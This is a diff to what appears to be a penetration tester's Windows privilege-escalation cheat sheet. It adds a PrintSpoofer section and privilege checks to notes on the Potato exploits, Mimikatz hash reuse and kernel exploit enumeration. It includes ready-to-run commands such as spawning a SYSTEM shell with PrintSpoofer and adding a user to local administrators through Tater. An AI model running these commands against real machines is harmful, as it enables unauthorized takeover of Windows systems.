@@ -169,13 +169,26 @@ Mimikatz:
 *then crack hashes or use pass the hash to login* 
 [Online hash cracker](https://crackstation.net/) 
 
-## Potato Exploits  
+## Privilige Exploits 
+
+
+
 [Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)   
 
+    whoami /priv
+    SeImpersonatePrivilige -> PrintSpoofer, Hot Potato 
     If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
     If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
 
+### PrintSpoofer 
+SeImpersonatePrivilige. Windows Server 2016, Server 2019, and Windows 10. 
+[Print Spoofer](https://github.com/itm4n/PrintSpoofer)  
+[Compiled exe](https://github.com/dievus/printspoofer)  
+
+     PrintSpoofer.exe -i -c cmd
+
 ### Hot Potato (Original)    
+SeImpersonatePrivilige
 Windows 7, 8, 10, Server 2008, and Server 2012. Patched. 
 exe: [Potato](https://github.com/foxglovesec/Potato/)     
 
@@ -184,6 +197,7 @@ exe: [Potato](https://github.com/foxglovesec/Potato/)
 Powershell: [Tater](https://github.com/Kevin-Robertson/Tater). Need to bypass powershell execution policy. Upload Tater and import.    
      Import-Module Tater.ps1 
      Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"   
+
 ### Juicy Potato   
 Look for SeImpersonate or SeAssignPrimaryToken 
 [binaries](https://github.com/ohpe/juicy-potato)  
@@ -204,8 +218,6 @@ run redirector on kali and exe on victim:
      using nishang web shell 
      
 
-
-
 ## Kernel exploits   
     systeminfo | findstr /B /C:"OS Name" /C:"OS Version"     
     wmic qfe get Caption,Description,HotFixID,InstalledOn     
@@ -216,7 +228,6 @@ https://github.com/rasta-mouse/Watson
 https://github.com/SecWiki/windows-kernel-exploits   
 
 ## Misc  
-[Print Spoofer](https://github.com/itm4n/PrintSpoofer)  
 [Print Demon](https://windows-internals.com/printdemon-cve-2020-1048/)  
 [SYSTEM Nightmare](https://github.com/GossiTheDog/SystemNightmare) Print nightmare implementation   
 [CVE 2019-1388](https://github.com/jas502n/CVE-2019-1388)   
